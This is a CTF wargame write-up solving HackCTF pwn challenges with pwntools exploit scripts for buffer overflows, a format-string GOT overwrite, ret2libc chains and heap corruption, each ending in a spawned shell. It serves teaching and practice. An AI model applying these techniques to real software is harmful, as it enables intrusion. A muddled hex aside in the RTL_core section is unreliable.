---
title: "HackCTF Pwn Challenges Writeup"
date: 2019-08-01
description: "HackCTF pwn category solutions: basic BOF, format string bugs, heap exploitation (tcache), RTL chaining, and x64 buffer overflow"
tags: ["HackCTF", "pwn", "buffer-overflow", "format-string", "heap", "RTL", "wargame"]
platform: "wargame"
category: "pwn"
difficulty: "easy-medium"
categories: ["CTF"]
authors:
  - name: "ph4nt0m"
    link: "https://github.com/Phantomn"
    image: "https://github.com/Phantomn.png"
---

## Basic BOF #1

### Binary Info

```
Arch:     i386-32-little
RELRO:    Partial RELRO
Stack:    No canary found
NX:       NX enabled
PIE:      No PIE (0x8048000)
```

### Source

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  char s[40]; // [esp+4h] [ebp-34h]
  int v5;     // [esp+2Ch] [ebp-Ch]

  v5 = 0x4030201;
  fgets(&s, 45, stdin);
  printf("\n[buf]: %s\n", &s);
  printf("[check] %p\n", v5);
  if ( v5 != 0x4030201 && v5 != 0xDEADBEEF )
    puts("\nYou are on the right way!");
  if ( v5 == 0xDEADBEEF )
  {
    puts("Yeah dude! You win!\nOpening your shell...");
    system("/bin/dash");
  }
  return 0;
}
```

### Analysis

The buffer `s` is 40 bytes. `v5` sits at `ebp-0xC`, which is 40 bytes above the start of `s` (`ebp-0x34`). Overflowing `s` by exactly 40 bytes reaches `v5` and overwrites it with `0xDEADBEEF` to get a shell.

### Exploit

```python
from pwn import *

e = ELF("./bof_basic")
r = remote("ctf.j0n9hyun.xyz", 3000)

payload = b"A" * 40 + p32(0xdeadbeef)
r.sendline(payload)
r.interactive()
```

```
$ id
uid=1000(attack) gid=1000(attack) groups=1000(attack)
```

---

## Basic BOF #2

### Binary Info

```
Arch:     i386-32-little
RELRO:    Partial RELRO
Stack:    No canary found
NX:       NX enabled
PIE:      No PIE (0x8048000)
```

### Source

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  char s[80];        // [esp+Ch] [ebp-8Ch]
  void (*v5)(void);  // [esp+8Ch] [ebp-Ch]

  v5 = (void (*)(void))sup;
  fgets(s, 133, stdin);
  v5();
  return 0;
}
```

### Analysis

`v5` is a function pointer initialized to `sup` (a benign function). It sits at `ebp-0xC`, which is `0x80` = 128 bytes above the buffer start (`ebp-0x8C`). The buffer is 80 bytes; the gap between the end of `s` and `v5` is `128 - 80 = 48` bytes.

Overflowing 80 + 48 = 128 bytes and then writing the address of the shell-spawning function redirects the call through `v5()`.

```
shell = 0x804849b  # address of the win function
```

### Exploit

```python
from pwn import *

e = ELF("./bof_basic2")
r = remote("ctf.j0n9hyun.xyz", 3001)
shell = 0x804849b

payload = b"A" * 80 + b"B" * 48 + p32(shell)
r.sendline(payload)
r.interactive()
```

```
$ id
uid=1000(attack) gid=1000(attack) groups=1000(attack)
```

---

## Basic FSB

### Binary Info

```
Arch:     i386-32-little
RELRO:    Partial RELRO
Stack:    No canary found
NX:       NX disabled
PIE:      No PIE (0x8048000)
RWX:      Has RWX segments
```

### Source

```c
int flag()
{
  puts("EN)you have successfully modified the value :)");
  return system("/bin/sh");
}

int vuln()
{
  char s[1024];
  char format;

  printf("input : ");
  fgets(s, 1024, stdin);
  snprintf(&format, 0x400u, s);
  return printf(&format);  // format string bug
}
```

### Analysis

The user input in `s` is copied into `format` via `snprintf`, then passed directly to `printf`. This is a classic format string vulnerability — the attacker controls the format string and can write arbitrary values to arbitrary addresses.

The goal is to overwrite `printf`'s GOT entry with the address of `flag()`, so the next call to `printf` executes a shell instead.

- `printf` GOT: `e.got['printf']`
- `flag` address: `0x80485b4`
- Format string offset: `2` (determined by probing with `%1$x`, `%2$x`, ...)

pwntools' `fmtstr_payload` automates constructing the write-what-where payload.

### Exploit

```python
from pwn import *

e = ELF("./basic_fsb")
r = remote("ctf.j0n9hyun.xyz", 3002)
printf_got = e.got['printf']
flag = 0x80485b4
offset = 2

payload = fmtstr_payload(offset, {printf_got: flag})
r.sendline(payload)
r.interactive()
```

```
input : EN)you have successfully modified the value :)
$ id
uid=1000(attack) gid=1000(attack) groups=1000(attack)
```

---

## x64 Buffer Overflow

### Binary Info

```
Arch:     amd64-64-little
RELRO:    Full RELRO
Stack:    No canary found
NX:       NX enabled
PIE:      No PIE (0x400000)
```

### Source

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  char s[268]; // [rsp+10h] [rbp-110h]
  int v5;      // [rsp+11Ch] [rbp-4h]

  _isoc99_scanf("%s", s, envp);
  v5 = strlen(s);
  printf("Hello %s\n", s);
  return 0;
}
```

### Analysis

The buffer is `0x110` = 272 bytes, but `rbp-0x110` with an 8-byte saved RBP means the return address is at offset 272 + 8 = 280 bytes from `s`. `scanf("%s")` has no length limit, enabling a straightforward ROP-based overflow.

Since there is no canary and no PIE, a hidden `callMeMaybe` function at `0x400606` can be called directly. Because this is x86-64, the first argument goes in `rdi`; a `pop rdi; ret` gadget at `0x400713` is used to set up arguments if needed.

In the simplest case — where `callMeMaybe` takes no arguments — the payload is just the offset padding followed by the function address:

```
offset = 280
payload = "A" * 280 + p64(callMeMaybe)
```

### Exploit

```python
from pwn import *

e = ELF("./64bof_basic")
r = remote("ctf.j0n9hyun.xyz", 3004)
offset = 280
pr_rdi = 0x400713
callMeMaybe = 0x400606

payload = b"A" * offset + p64(callMeMaybe)
r.sendline(payload)
r.interactive()
```

```
$ id
uid=1000(attack) gid=1000(attack) groups=1000(attack)
```

---

## beginner_heap

### Binary Info

```
Arch:     amd64-64-little
NX:       NX enabled
Stack canary present
```

### Source

```c
void __fastcall __noreturn main(int a1, char **a2, char **a3)
{
  void *v3;  // [rsp+10h] [rbp-1020h]
  void *v4;  // [rsp+18h] [rbp-1018h]
  char s[4104];

  v3 = malloc(16);
  *v3 = 1;
  *(v3 + 1) = malloc(8);   // inner buffer for v3

  v4 = malloc(16);
  *v4 = 2;
  *(v4 + 1) = malloc(8);   // inner buffer for v4

  fgets(s, 4096, stdin);
  strcpy(*(v3 + 1), s);    // unchecked copy into 8-byte buffer

  fgets(s, 4096, stdin);
  strcpy(*(v4 + 1), s);

  exit(0);
}
```

### Analysis

Each "node" is a 16-byte heap chunk: the first 8 bytes hold an integer ID, and the next 8 bytes hold a pointer to an 8-byte inner buffer. The first `strcpy` copies up to 4096 bytes into the 8-byte inner buffer of `v3`, overflowing onto the heap.

Because `v3`'s inner buffer (8 bytes) is immediately followed by `v4`'s 16-byte chunk, the overflow can overwrite `v4`'s fields — in particular, the pointer at `*(v4 + 1)`. The second `strcpy` then writes into whatever address `*(v4 + 1)` now points to, giving a write-what-where primitive.

The target is `get_flag` — a function that reads and prints `flag`. By directing the second write to overwrite a function pointer (or a GOT entry reachable through `exit`), `get_flag` executes.

The tcache allocator in glibc ≥ 2.26 means freed chunks of the same size are recycled immediately, and the layout is deterministic for this simple case.

---

## RTL_core

### Binary Info

```
Arch:     i386-32-little
RELRO:    Partial RELRO
Stack:    No canary found
NX:       NX enabled
PIE:      No PIE (0x8048000)
```

### Source

```c
int __cdecl check_passcode(int a1)
{
  int v2 = 0;
  for ( int i = 0; i <= 4; ++i )
    v2 += *(_DWORD *)(4 * i + a1);
  return v2;
}

ssize_t core()
{
  int buf;
  // ...
  void *v4 = dlsym((void *)0xFFFFFFFF, "printf");
  printf(&format, v4);          // leaks printf address
  return read(0, &buf, 0x64u);  // BOF
}

int main(int argc, const char **argv, const char **envp)
{
  char s[24];
  gets(s);                                  // unchecked read
  if ( check_passcode((int)s) == hashcode ) // hashcode = 3235492007
    core();
}
```

### Stage 1 — Passcode bypass

`check_passcode` sums five consecutive 32-bit integers starting at the input buffer and compares to `hashcode = 3235492007 (0xC0DEC0DE... wait: 0xC0DEB33F)`.

`3235492007 / 5 = 647098401` with remainder `2`. So four equal values plus one that is 2 larger satisfies the sum:

```
data = 0x2691f021  # 647098401
payload = p32(data) * 4 + p32(data + 2)
```

### Stage 2 — ret2libc

After passing the check, `core()` leaks `printf`'s runtime address via `dlsym`, then reads 100 bytes into a 62-byte buffer (`buf` at `ebp-0x3E`), giving a 38-byte overflow past the saved EIP.

Using the leaked `printf` address, compute libc base and derive `system` and `/bin/sh` offsets. The return-to-libc chain:

```
[padding 66B] [system] [AAAA] [/bin/sh]
```

### Full Exploit

```python
from pwn import *

context.arch = 'i386'
p = process("./rtlcore")
libc = ELF("/lib/i386-linux-gnu/libc.so.6")

# Stage 1
data = 0x2691f021
payload = p32(data) * 4 + p32(data + 2)
p.recvuntil("Passcode: ")
p.sendline(payload)

# Leak printf
p.recvuntil("0x")
printf = int(p.recv(8), 16)
print("printf addr:", hex(printf))

libc_base  = printf - libc.symbols['printf']
system_addr = libc_base + libc.symbols['system']
binsh_addr  = libc_base + next(libc.search(b"/bin/sh"))

# Stage 2
payload2 = b"A" * 66
payload2 += p32(system_addr)
payload2 += b"AAAA"
payload2 += p32(binsh_addr)
p.sendline(payload2)
p.interactive()
```

```
$ id
uid=1000(phantom) gid=1000(phantom) groups=1000(phantom)
```

---

## gift

### Binary Info

```
Arch:     i386-32-little
RELRO:    No RELRO
Stack:    No canary found
NX:       NX enabled
PIE:      No PIE (0x8048000)
```

### Source

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  char s[128];

  printf("Hey guyssssssssss here you are: %p %p\n", &binsh, &system);
  fgets(s, 128, stdin);
  printf(s);   // format string vulnerability (unused here)
  gets(s);     // unconstrained read — BOF
  return 0;
}
```

### Analysis

The binary hands out two addresses: `&binsh` (a writable global that can hold the `/bin/sh` string) and `&system` (a pointer to `system()`). The trick is that `&binsh` is not a pointer to the string — it is the **buffer** where `/bin/sh` must be written first.

The two-stage exploit:
1. Use `gets@plt` to write `/bin/sh\x00` into the `binsh` buffer (gadget: `pop ret` cleans the argument).
2. Call `system(binsh)` via RTL.

The overflow offset from `s` to the saved EIP is `128 + 4 (saved EBP) = 136` bytes.

### Exploit

```python
from pwn import *

p = process("./gift")
e = ELF("./gift")
context.arch = 'i386'

p.recvuntil("Hey guyssssssssss here you are: ")
data = p.recvline().split()
binsh  = int(data[0], 16)
system = int(data[1], 16)

popret    = 0x080483ad
gets_plt  = e.plt['gets']

# Discard fgets input (format string stage)
p.sendline(b"A" * 4)

# BOF via gets: call gets(binsh) then system(binsh)
payload  = b"A" * 136
payload += p32(gets_plt)
payload += p32(popret)
payload += p32(binsh)
payload += p32(system)
payload += b"BBBB"
payload += p32(binsh)

p.sendline(payload)
p.sendline(b"/bin/sh\x00")
p.interactive()
```

```
$ id
uid=1000(phantom) gid=1000(phantom) groups=1000(phantom)
```

---

## fengshui

### Binary Info

```
Arch:     i386-32-little
RELRO:    Partial RELRO
Stack:    Canary found
NX:       NX enabled
PIE:      No PIE (0x8048000)
```

### Source Overview

A heap management challenge with four operations: Add, Delete, Display, and Update.

```c
// add_location: allocates a variable-size description buffer + a fixed 0x80 metadata chunk
_DWORD *__cdecl add_location(size_t a1)
{
  void *s  = malloc(a1);      // description buffer (user-controlled size)
  _DWORD *v3 = malloc(0x80);  // metadata chunk
  *v3 = s;                    // v3[0] = pointer to description
  // v3[4..] = name (up to 124 bytes)
  *(&store + cnt) = v3;
  update_desc(cnt++);
  return v3;
}

// update_desc: bounds-checked write into the description buffer
unsigned int __cdecl update_desc(unsigned __int8 a1)
{
  int v3 = 0;
  scanf("%u%c", &v3, &v2);
  // guard: rejects writes that would reach the metadata chunk
  if ( (char *)(v3 + *v3_desc_ptr) >= (char *)metadata_ptr - 4 )
  {
    puts("Nah...");
    exit(1);
  }
  read_len(*desc_ptr, v3 + 1);
}
```

### Vulnerability

The `update_desc` bounds check compares the end of the requested write against the metadata pointer minus 4. With careful heap layout, allocating chunks of specific sizes causes the freed description buffer from one location to be recycled as the metadata chunk for a subsequent allocation (tcache / fastbin reuse). This lets the description write overwrite the `*v3` field (the description pointer) of another location.

Once the pointer is corrupted, a `display_location` call leaks a heap or libc address, and a subsequent `update_desc` writes to an arbitrary address — enabling a GOT overwrite or similar technique to redirect execution to a shell.

The exact payload depends on the libc version and heap layout at runtime; the general primitive is: **heap overflow → pointer corruption → arbitrary write → GOT overwrite → shell**.
